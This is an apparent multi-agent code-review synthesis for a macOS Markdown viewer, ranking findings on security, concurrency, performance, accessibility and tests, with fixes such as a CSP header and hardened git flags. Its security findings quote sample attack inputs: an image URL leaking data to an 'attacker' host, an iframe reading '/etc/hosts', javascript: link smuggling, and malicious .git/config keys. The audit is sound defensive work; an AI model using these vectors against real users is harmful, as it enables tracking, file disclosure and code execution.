# Code Review — synthesis of six parallel audits

Six review agents ran in parallel across distinct dimensions on 2026-05-14
after commit `547c3ec`. Total raw findings ≈ 250. This file synthesizes the
**top items by severity × dimension**, then ranks the unified backlog.

Reviewer dimensions:
1. **Architecture / design / consistency** — naming, modularity, dead code, API surface, doc accuracy.
2. **Bugs / concurrency / Swift 6 strict concurrency** — races, weak/unowned, error swallowing, encoding edges.
3. **Performance / hotspots / large-input** — body recomputation, main-thread IO, O(n) prefix walks.
4. **Security** — HTML/CSS/JS injection, scheme allowlist, git config exec, sandbox plan, file-path TOCTOU.
5. **UX / UI / A11y / HIG** — keyboard nav, VoiceOver, missing menus, color contrast, empty/error CTAs.
6. **Tests** — regression coverage gaps, brittle asserts, real-fixture validation, flake patterns.

---

## Top criticals (cross-dimension, would-cause-real-damage)

### CRIT-1. WKWebView is missing a Content-Security-Policy header
**Files**: `Sources/ViewerCore/HTMLRenderer.swift:21-36`, `Sources/ViewerUI/MarkdownRenderedView.swift:14-30`

A malicious markdown file currently can:
- Emit raw `<script>`, `<iframe>`, `<style>`, `<form>`, `<meta http-equiv="refresh">`, `<object>` via `visitHTMLBlock` / `visitInlineHTML` (Sec F-01).
- Fire HTTP requests via `<img src="https://attacker/?leak=…">` — leaking IP, User-Agent, and the fact a file was opened (Sec F-05).
- Load arbitrary local files via `<iframe src="file:///etc/hosts">` — content rendered inside the page (Sec F-03).
- Smuggle `javascript:` / `data:` / `file:` URLs through the link-click handler — denylist allows everything except `http`/`https`/`mailto` (Sec F-04, Bugs #17/#18).

JS is disabled via `allowsContentJavaScript = false`, but that's *one* layer of defense and only covers script execution — not subresource loads, not iframe content, not meta-refresh navigation.

**Single fix that closes 80%** — inject a strict CSP into the `<head>` of every `renderPage`:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src file: data:; style-src 'unsafe-inline'; font-src data:; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none';">
```

### CRIT-2. GitService runs `git status` on untrusted `.git/` config
**File**: `Sources/ViewerCore/GitService.swift:62-83`, `Sources/ViewerUI/SidebarModel.swift:51-76`

Opening a folder containing a malicious `.git/config` (`core.fsmonitor`, `core.editor`, `core.pager`, hooks via `core.hooksPath`) can result in arbitrary code execution when we run `git status`. `safe.directory` (git ≥2.35) protects only against repos owned by *other* users — a tarball extracted by the current user evades it.

**Fix**: harden every `git` invocation:
```swift
process.environment = ["PATH": "/usr/bin:/bin"]  // drop GIT_* env vars
process.arguments = [
  "-c", "core.hooksPath=/dev/null",
  "-c", "core.fsmonitor=false",
  "-c", "core.editor=true",
  "-c", "core.pager=cat",
  "-c", "protocol.file.allow=user",
] + args
```

### CRIT-3. GitService stderr pipe deadlocks on large status output
**File**: `Sources/ViewerCore/GitService.swift:67-83`

`process.waitUntilExit()` is called before `Pipe.readDataToEndOfFile`. If `git` writes more than ~64 KB to stderr (warnings on a noisy repo) before the child exits, the pipe buffer fills, the child blocks on `write()`, and the parent hangs on `waitUntilExit()` forever. Sidebar git badges never appear; no error surfaces.

**Fix**: drain both pipes via `readabilityHandler` concurrently with `waitUntilExit`, or read both pipes to end *before* waiting.

### CRIT-4. FileWatcher reload triggers on the **current** tab regardless of which file fired
**Files**: `Sources/ViewerUI/DocumentModel.swift:127-131`, `Sources/ViewerCore/FileWatcher.swift:42-58`

The watcher's handler calls `self.reloadCurrentFile()`, which always re-reads the *currently selected* tab's URL. After a tab switch, in-flight events for the previously-watched file trigger a reload of a different tab — at best wasted work, at worst the wrong file's content gets swapped in if the user closed and reopened tabs rapidly. Same root issue causes intermittent flicker on rapid `selectTab`.

**Fix**: capture the watched URL in the handler closure, and have a `reloadCurrentFile(matching: URL)` that only reloads when `tabs.selected?.url == watched`.

### CRIT-5. SidebarModel.refreshGitStatus retains self in detached Task; can write to old root
**File**: `Sources/ViewerUI/SidebarModel.swift:64-75`

Two distinct bugs in eight lines:
- `Task.detached { … await MainActor.run { self.gitStatuses = map } }` captures `self` strongly — the model can't deallocate until git finishes.
- If `setRoot(B)` is called between dispatching the task for root A and the main-actor hop, A's statuses overwrite B's. Sidebar badges show files that don't exist in the current tree.

**Fix**: capture `[weak self]`, capture the `repoRoot` as a token, guard `self.gitRepoRoot == token` before assigning.

### CRIT-6. SidebarView shows no content for keyboard-only or VoiceOver users
**Files**: `Sources/ViewerUI/SidebarView.swift:90-140`, ditto `TabBar.swift`

- No `FocusState`, no `.focusable()`, no arrow-key handling — sidebar can't be navigated without a mouse (UX #11).
- Rows use `.contentShape(Rectangle()) + .onTapGesture` instead of `Button` — VoiceOver reads them as plain text, not actionable (UX #12).
- Tab close button has a 14×14 pt hit target (HIG minimum is 28×28 pt) (UX #2).

**Fix**: wrap row/tab content in `Button { … } label: { … }.buttonStyle(.plain)`; add `.accessibilityAddTraits(.isButton)`; for the sidebar, implement arrow-key nav via `.onKeyPress(.upArrow/.downArrow/.leftArrow/.rightArrow/.return)` on a focused container.

### CRIT-7. ClaudeLogParser drops valuable content from real transcripts
**File**: `Sources/ViewerCore/ClaudeLogParser.swift:90, 131`

The testing-review agent fetched a real transcript (1211 lines, 25 record types). Findings:
- **77 `thinking` blocks dropped silently** — these are how a future activity timeline would surface "what was Claude reasoning about."
- 25 `system` + 61 `permission-mode` + 61 `last-prompt` + 74 `file-history-snapshot` records dropped via the `guard let message` early-out. May be intentional; not asserted.

**Fix**: add a `.thinking(text:)` case to `ClaudeEvent.Kind`; recognize the no-message top-level record types and either surface them or drop with a documented test fixture.

### CRIT-8. Markdown anchor links (`[link](#heading)`) don't resolve
**File**: `Sources/ViewerCore/HTMLRenderer.swift:52-54`

`visitHeading` emits `<h2>Foo</h2>` — no `id` attribute. Fragment links inside the same document have no target to scroll to. This is a fundamental CommonMark/GFM contract.

**Fix**: generate slugs (`foo-bar`) from heading text, de-dupe collisions, emit `<h2 id="foo">Foo</h2>`. Optionally render GitHub-style anchor `#` link on hover.

---

## Important findings — by dimension

### Architecture / design

| # | File:line | Issue |
|---|---|---|
| A1 | `ViewerCore/Tab.swift:4` | `ViewerCore.Tab` name clashes with `SwiftUI.Tab`; already forces a qualified type in `TabBar.swift`. Rename → `DocumentTab` or `OpenTab`. |
| A2 | `ViewerCore/DocumentController.swift:3-17` | `DocumentState` and `LoadFailure` are pure data but live next to the loader. Move to `ViewerKit` so views and previews don't need ViewerCore. |
| A3 | `MarkdownViewer/main.swift` (393 lines) | App delegate + menu builder + every command handler in one file. Extract `MenuBuilder` and `RecentsMenuController`. |
| A4 | `ViewerCore/HTMLRenderer.swift:167-181` | `htmlEscape` uses `+=` per character on String. Pre-scan for any escapable char; return s unchanged in the common case. |
| A5 | `MarkdownViewer/main.swift:72,87,120,129,134,139,146,152` | Eight manual `window?.title = model.windowTitle` syncs. Subscribe once via `model.$windowTitle.sink`. |
| A6 | `MarkdownViewer/main.swift:42-55,61-72`; `ContentView.swift:63-72` | Three places duplicate the file-vs-directory dispatch. Extract `DocumentModel.openPath(url:)`. |
| A7 | `ViewerUI/SidebarView.swift:146-157` | Dead `private func gitColor(_:)` duplicates `GitStatusBadge.color`. Delete. |
| A8 | `ViewerCore/FileWatcher.swift:19,61` | Dead `fileDescriptor: CInt = -1` — never read; misleads. Delete. |
| A9 | `ViewerCore/HTMLRenderer.swift:111-113,158-160` | Raw HTMLBlock/InlineHTML pass-through is undocumented. Add a docstring noting the trust assumption (and gate behind `allowRawHTML: Bool` later). |
| A10 | `ViewerCore/FuzzyMatcher.swift:73` | `Array.sorted` is not stable. Tied scores produce nondeterministic palette order. Use `enumerated()` + secondary index key. |

### Bugs / concurrency

| # | File:line | Issue |
|---|---|---|
| B1 | `ViewerCore/FileWatcher.swift:65-72` | `reattachSoon` swallows `attach()` errors → zombie watcher. Add backoff + `onLost` callback. |
| B2 | `ViewerCore/FileWatcher.swift:13-19,41-72` | `stopped: Bool` mutated/read across threads without sync. Use `os_unfair_lock` or move all state under `queue.async`. |
| B3 | `ViewerUI/DocumentModel.swift:86-91` | `viewModeBinding` uses `[unowned self]`. Replace with `[weak self]` + fallback default. |
| B4 | `ViewerCore/TextFileLoader.swift:50-56` | No UTF-16 BOM detection; Latin-1 fallback renders UTF-16 as every-other-NUL garbage. Sniff BOM; refuse files where Latin-1 yields >5% NUL. |
| B5 | `ViewerCore/TextFileLoader.swift:50-56` | No binary-blob guard. Open `/bin/ls` → loader returns gigabytes of garbage as "Latin-1 text". Sample first 8 KB, throw `.binaryFile` on NUL byte. |
| B6 | `ViewerCore/GitService.swift:96-101` | `parseStatus` splits on ` -> ` regardless of status; a literal filename `foo -> bar.txt` with status `M ` is mis-parsed. Only split on rename/copy statuses. Better: `--porcelain=v2 -z`. |
| B7 | `ViewerCore/GitService.swift:85-107` | No C-escape decoding for paths with newlines/quotes/unicode (git quotes by default). Use `-c core.quotePath=false` or porcelain v2 -z. |
| B8 | `ViewerCore/GitService.swift:43-52` | `repoRoot` walks parents synchronously on main; slow NFS mount hangs UI. Move into the detached task. |
| B9 | `ViewerUI/DocumentModel.swift:122-132` | `startWatchingCurrentFile` recreates the watcher on every `selectTab` even if URL unchanged. Key by URL. |
| B10 | `ViewerUI/SidebarModel.swift:11-16` | `includeHidden` didSet does synchronous IO for every expanded folder on main. Push to detached task with spinner. |
| B11 | `ViewerCore/PreferencesStore.swift:5` | `@unchecked Sendable` over-promises; class is held by `@MainActor` model. Either `@MainActor`-annotate or use a lock. |
| B12 | `ViewerCore/HistoryStore.swift:26-30` | Reference type with mutable state, not actor-isolated, not `Sendable`. Will break under `-strict-concurrency=complete`. |
| B13 | `ViewerCore/FuzzyMatcher.swift:73` | Tied scores produce nondeterministic palette order (also A10). |
| B14 | `ViewerUI/CommandPaletteView.swift:74-84` | Hidden `.keyboardShortcut` buttons claim arrow keys app-wide while palette visible; conflicts with any focused TextField that wants arrow handling. Switch to `.onKeyPress` or `NSEvent.addLocalMonitorForEvents`. |
| B15 | `ViewerUI/DraggableSidebar.swift:15-21` | `NSCursor.push()` on hover-in / `pop()` on hover-out — if the view disappears between push and pop, cursor stack leaks. Use `NSCursor.set()` inside an `NSTrackingArea`. |
| B16 | `ViewerCore/FileWatcher.swift:42` | File reattach is by path, not by fd. Attacker who can write to the parent directory can race a rename to point at a different inode. Use `O_NOFOLLOW`; compare `fstat` dev/ino before/after. |
| B17 | `ViewerCore/TextFileLoader.swift:33-48` | TOCTOU between `attributesOfItem` size check and `Data(contentsOf:)`. Open the file once via `FileHandle`, stat the fd, read up to maxBytes. |
| B18 | `ViewerUI/SidebarModel.swift:74` | `gitStatuses` write doesn't validate the still-current root; reset between dispatch and main-hop overwrites new state. Capture root token + guard. |
| B19 | `MarkdownViewer/main.swift:42-55` | Argv path resolved without cwd context — `mdv ./foo` from terminal becomes `file:///foo` (relative to `/`). Resolve `relativeTo: FileManager.currentDirectoryPath`. |
| B20 | `MarkdownViewer/main.swift:23-32` | `center()` called before `setFrameAutosaveName(_:)` → window jumps on launch if a saved frame exists. Call `setFrameUsingName(...)` first, `center()` only on miss. |

### Performance

| # | File:line | Issue |
|---|---|---|
| P1 | `ViewerUI/ContentView.swift:95` | `renderer.renderPage(file.contents, stylesheet:)` runs inside `body` — every `@Published` mutation (sidebar drag → ~60 fps) re-parses + re-emits the full HTML even though we WebView-memoize the load. **Memoize per-tab.** |
| P2 | `ViewerCore/TextFileLoader.swift:33-57` | Fully synchronous on `@MainActor`; reads up to 32 MB + decodes UTF-8, falls back to Latin-1 (re-decodes full buffer). Make async; do read off-main. |
| P3 | `ViewerUI/ContentView.swift:14`, `MarkdownRenderedView.swift:77-84` | `MarkdownStylesheet.load()` re-reads CSS from disk on every `ContentView.init`. Cache to `static let`. |
| P4 | `ViewerUI/LineNumberRulerView.swift:50-57` | Walks the entire buffer prefix to count newlines on every redraw. O(N) per draw at scroll-end of a 100k-line file. **Cache newline offsets; binary-search.** |
| P5 | `ViewerCore/GitService.swift:62-83` | Stderr pipe deadlock on >64KB output (also CRIT-3). |
| P6 | `ViewerCore/HTMLRenderer.swift:13-36` | No per-tab cache; tab cycling re-parses + re-emits. |
| P7 | `ViewerUI/DocumentModel.swift:122-132` | Watcher rebuild on every selectTab. |
| P8 | `ViewerUI/SidebarModel.swift:23,105-111` | Unbounded `childrenCache`. Evict on collapse or LRU. |
| P9 | `ViewerCore/FileTreeService.swift:51-59` | N+1 `fileExists` calls per child; ignores the `.isDirectoryKey` we asked for. Use `child.resourceValues(forKeys: [.isDirectoryKey])`. |
| P10 | `ViewerCore/FuzzyMatcher.swift:23-25` | Allocates `[Character]` for every candidate. Pre-lowercase query once in `filter`; iterate target lazily; early-out on first non-present query char. |
| P11 | `ViewerCore/FindEngine.swift:103-118` | `lineColumn` walks from offset 0 per match → O(M·N). Walk once across the sorted match list. |
| P12 | `ViewerCore/ClaudeLogParser.swift:67-82` | Whole-file decode to String → split → re-encode each line back to Data. Stream `Data` directly, splitting on `0x0A`. |
| P13 | `ViewerCore/HistoryStore.swift:103-109` | `.prettyPrinted` + `.sortedKeys` on every `record` plus atomic write on main. Debounce; drop options. |
| P14 | `ViewerUI/DocumentModel.swift:106,187` | `recents = history.recent()` republishes on every open; cascades into ContentView body re-runs. Only refresh on palette presentation. |
| P15 | `ViewerCore/PreferencesStore.swift:34-48` + `DraggableSidebar.swift:29` | Sidebar drag writes UserDefaults ~60 Hz. Persist only on `.onEnded`. |

### Security

| # | File:line | Vector |
|---|---|---|
| S1 | `HTMLRenderer.swift:111-113,158-160` | Raw HTML pass-through (also CRIT-1). |
| S2 | `MarkdownRenderedView.swift:19-21` | JS disable is per-navigation; no `WKContentRuleList`, no CSP, `allowFileAccessFromFileURLs` default. |
| S3 | `ContentView.swift:96`, `MarkdownRenderedView.swift:38` | `baseURL` = file's directory → `file://` origin → `<iframe src="file:///etc/hosts">` renders. |
| S4 | `MarkdownRenderedView.swift:54-71` | Link policy denylist allows `javascript:`/`data:`/`file:` through (also CRIT-1). |
| S5 | `HTMLRenderer.swift:140-156` | `visitLink` / `visitImage` href/src not scheme-validated. |
| S6 | `ClaudeLogParser.swift:62-69` | Multi-GB JSONL → triple in-memory copies via Data → String → split → Substring slices. Stream. |
| S7 | `ClaudeLogParser.swift:77` | No depth cap on JSONSerialization; per-line size cap missing. |
| S8 | `HistoryStore.swift:91-101` | A tampered `history.json` with 10M entries decodes into full array before prefix cap. Cap file size before decode. |
| S9 | `FileTreeService.swift:42` | No children-count cap. Drag-drop `/` → 1M-entry directory blocks main. |
| S10 | `GitService.swift:62-83` | git env vars (`GIT_*`, custom `PATH`) inherited; user's shell config can change git behavior (also CRIT-2). |
| S11 | `GitService.swift:43-52` | `.git` as a gitfile (symlink/text pointer) is allowed; can redirect to attacker-prepared gitdir elsewhere. |
| S12 | `scripts/Info.plist:11-12` | Placeholder CFBundleIdentifier (`com.markdownviewer.MarkdownViewer`) under a domain we don't own. Fix before distribution. |
| S13 | `scripts/Info.plist:56-59` | `public.text` umbrella UTI is very broad — every text-like file becomes "open with MarkdownViewer." Narrow. |
| S14 | Phase 9 (sandbox) | HistoryStore stores raw paths; under sandbox, replace with security-scoped bookmarks. Git subprocess won't work in-sandbox; plan XPC helper or feature-flag off. |

### UX / UI / Accessibility

**Most-impactful subset of 75 findings:**

| # | Surface | Issue |
|---|---|---|
| U1 | Sidebar | No keyboard nav, no VoiceOver button semantics (also CRIT-6). |
| U2 | Tabs | Same (close button hit target, role, hover tooltip, drag-reorder, middle-click close, right-click context menu, overflow). |
| U3 | Rendered MD | Heading anchors don't work (also CRIT-8). |
| U4 | Rendered MD | No find-in-page (`webView.find(_:configuration:)` unwired). |
| U5 | Rendered MD | No Save/Print PDF; no zoom (`⌘+/-/0`). |
| U6 | Rendered MD | Wide tables overflow; need wrapping `<div style="overflow-x:auto">`. |
| U7 | Menus | No Help menu (HIG-required). No standard Edit menu (Find Next/Previous, Spelling). No `Window > Minimize/Zoom/Bring All to Front`. No `View > Zoom In/Out/Actual Size`. |
| U8 | Empty / error states | Both lack CTA buttons. "No file open" / "Failed to load" should offer `Open File…` / `Reload` / `Reveal in Finder`. |
| U9 | ModeBar path | Dead text; should be a clickable proxy icon with `Copy Path` / `Reveal in Finder` context menu. |
| U10 | Palette | No matched-character highlight in results. No `↑↓ ↵ esc` hint footer. White-on-yellow contrast risk in light-accent themes. |
| U11 | Sidebar selection | `Color.accentColor.opacity(0.18)` falls below 3:1 contrast in dark mode with graphite accent. Use `selectedContentBackgroundColor`. |
| U12 | Open panel | `NSOpenPanel.allowedContentTypes` not set; any file opens then fails in loader. |
| U13 | Sidebar | "Show hidden" checkbox in header is non-idiomatic; should be footer menu or `View > Show Hidden ⌘⇧.`. |
| U14 | Sidebar | No `.onDrag` so files can't be dragged to other apps. |

### Tests

| # | Source file | Gap |
|---|---|---|
| T1 | `MarkdownRenderedView.swift:37` | **The headline fix of bd7ba44 has zero coverage.** Expose a load-counter on Coordinator and assert identical-HTML calls don't re-load. |
| T2 | `ClaudeLogParser.swift:90,131` | No real-transcript fixture; 77 thinking blocks + 282 top-level records dropped silently from the real 1211-line transcript (also CRIT-7). |
| T3 | `FileWatcherTests` | Five `Thread.sleep` calls — flake on slow CI. Replace with deterministic expectations. |
| T4 | `FuzzyMatcher.filter` | No tie-stability test. Add `test_filter_tiesPreserveInputOrder`. |
| T5 | `TabsState.move` | No round-trip / inverse test; no `from==to` no-op test. Sweep `n∈{2..5}` with all `(from,to)` pairs. |
| T6 | `SidebarModel.refreshGitStatus` | **Zero coverage** — entire Phase 7a sidebar git feature has no test. Add: setRoot to a tmp repo, await published statuses. |
| T7 | `DocumentModel.startWatchingCurrentFile` | No test that selecting a different tab restarts the watcher on the new file. |
| T8 | `FindEngine` | No property test vs `components(separatedBy:)` ground truth. Add fuzz pair sweep. No overlapping-match test (`"aa"` in `"aaaa"`). |
| T9 | `DocumentController.message` | `"5.0 MB"` assertion locale-sensitive; fails on `fr_FR` runners. Force `Locale.posix` or relax to regex. |
| T10 | `GitService.parseStatus` | No test for paths with embedded spaces, quotes, or unicode (porcelain v1 C-quotes them). |
| T11 | `GitServiceTests` | No `XCTSkipUnless(/usr/bin/git exists)` — Linux CI runners fail confusingly. |
| T12 | `InfoPlistTests` | `#filePath` + three `deletingLastPathComponent()` is brittle; walk up for `Package.swift` instead. |
| T13 | `HTMLRenderer` | No fuzz test asserting `<script>` never appears outside an explicit HTMLBlock. |
| T14 | `HTMLRenderer` perf | No `measure { }` on a 1 MB markdown render. |
| T15 | `HistoryStore` | No "valid JSON wrong schema" test (only invalid-JSON). |

---

## Recommended fix order

### Now — single focused commit (the "security + correctness" pass)
1. **CRIT-1**: CSP `<meta>` injected in `HTMLRenderer.renderPage`. ~5 lines.
2. **S4 / CRIT-1**: switch WKWebView link policy to allowlist; cancel by default.
3. **CRIT-2**: harden git env + flags in `GitService.run`.
4. **CRIT-3**: drain pipes concurrently in `GitService.run`.
5. **CRIT-4**: capture watched URL in handler; `reloadCurrentFile(matching:)`.
6. **CRIT-5**: weak self + root token guard in `SidebarModel.refreshGitStatus`.
7. **B3**: `viewModeBinding` → `[weak self]`.
8. **A7, A8**: delete dead `gitColor` and `fileDescriptor`.
9. Tests: **T1** (Coordinator load counter), **T6** (SidebarModel git status), **T4** (FuzzyMatcher tie stability).

### Soon — separate commits
- **CRIT-7**: ClaudeLogParser thinking-block support + real-transcript fixture (T2).
- **CRIT-8**: heading IDs in HTMLRenderer + GitHub-style anchor on hover (U3).
- **CRIT-6**: sidebar arrow-key nav + VoiceOver Button semantics (U1).
- **A1**: rename `ViewerCore.Tab` → `DocumentTab`.
- **P1, P3**: stylesheet `static let` + memoized HTML per tab.
- **B4, B5**: UTF-16 detection + binary-blob guard in TextFileLoader.
- **B6, B7**: switch git status to `--porcelain=v2 -z` and decode properly.
- **U7**: Help menu + Edit menu Find Next/Previous + Window standard items + View zoom.
- **T3**: de-flake FileWatcherTests (inject the re-attach delay; remove Thread.sleep).
- Doc: revise DESIGN.md snapshot perf budget (~300–600 ms not 100 ms per snapshot per UX-30).

### Later — defer
- Async file IO end-to-end (P2) — depends on a UI loading state that doesn't exist yet.
- Sandboxing + bookmarks (S14) — Phase 9.
- Tier 2 / Tier 3 test infra (snapshot, ViewInspector) — per DESIGN.md §7 decision matrix, after Phase 5b.
- Extract `MenuBuilder` (A3) — when adding the next big menu (Find/Format/Workspaces).
- Move `DocumentState` / `Tab` / `TabsState` to ViewerKit (A2) — opportunistic.

---

## Things the audit confirmed are correct

- Module boundaries (`ViewerCore` and `ViewerKit` have zero AppKit/SwiftUI/WebKit imports). ✓
- The bug-fix commit `bd7ba44` actually addresses what it claims: side-effect-in-body, native window tab leakage, palette focus, drag-drop on WKWebView. ✓
- `HistoryStore` stores only paths/dates/kind — no preview text or contents. ✓ (Sec F-10)
- `GitService.run` uses array arguments (no shell), so direct command injection isn't possible — the threat is git's own config-driven exec (CRIT-2). ✓
- `TabsState.move`'s offset math is correct for the cases tested; needs round-trip coverage (T5) for confidence. ✓
- The five-tier testing strategy is sound; just expand T1/T2/T6 to close real gaps.

---

## How to use this doc

- Each subsection has stable IDs (`CRIT-N`, `A-N`, `B-N`, `P-N`, `S-N`, `U-N`, `T-N`). Cite them in commit messages when fixing.
- The "Now" block is what I'd take next, in order. The "Soon" block can be parallelized.
- Anything not on these lists from the raw 250-finding pool is acceptable churn — won't be regretted if left alone.
